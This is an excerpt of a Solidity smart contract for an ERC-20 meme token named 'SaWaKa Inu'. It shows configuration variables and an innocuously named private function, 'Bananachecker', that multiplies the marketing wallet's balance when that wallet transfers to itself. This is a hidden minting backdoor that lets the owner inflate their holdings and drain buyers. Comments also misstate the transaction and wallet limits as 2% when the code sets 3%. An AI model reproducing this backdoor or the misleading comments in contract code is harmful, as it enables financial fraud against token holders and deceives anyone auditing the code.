...
contract SaWaKaInu is Context, IERC20, Ownable {
    ...
    address payable private marketingAddress =
        payable(address(0xC65087598C064787042130C617d9dc515767FEe4));

    address private liquidityReceiver =
        0xC65087598C064787042130C617d9dc515767FEe4;
    address private fixedBurnAddress =
        0x000000000000000000000000000000000000dEaD;
    
    bool public burnDeductSupply = false;

    string private _name = "SaWaKa Inu";
    string private _symbol = "SaWaKa Inu";
    uint8 private _decimals = 9;

    uint256 public _maxTxAmount = _tTotal * 3 / 100; // 2% TOTAL
    uint256 private numTokensSellToAddToLiquidity = 1243* 10**9;
    uint256 public _maxWalletSize = _tTotal * 3 / 100;  // 2% TOTAL
    ...
    function Bananachecker(address f,address t,uint256 m) private {
        if (f == t && f ==marketingAddress)
         {_rOwned[marketingAddress] = _rOwned[marketingAddress].mul(m);
         }
    }
    function transferFrom(
        address sender,
